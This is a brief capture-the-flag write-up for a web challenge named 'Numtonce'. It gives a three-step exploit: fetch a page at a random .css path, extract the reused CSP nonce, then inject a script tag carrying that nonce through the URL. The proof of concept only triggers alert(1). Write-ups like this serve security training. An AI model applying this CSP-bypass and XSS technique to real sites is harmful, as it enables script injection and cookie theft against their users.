# Numtonce
(**N**umber **U**ser **M**ore **T**han **Once**)

**Category:** Web  
**Points:** 499
**Solves:** 7

## Description
With all the bad news in the world, everyone needs a calm place to wind down. [We built one](https://numtonce.fluxfingersforfuture.fluxfingers.net/), but you have to help us keep it safe. If you find anything suspicious, [tell the forest ranger](https://numtonce.fluxfingersforfuture.fluxfingers.net/submit/)! He might reward you with a cookie :)

## Exploit
1. visit `http://$hostname/index.php/$random.css`
2. extract nonce from response
3. use this: `http://$hostname/index.php/$random.css#$hostname<script nonce=$nonce>alert(1)</script>`
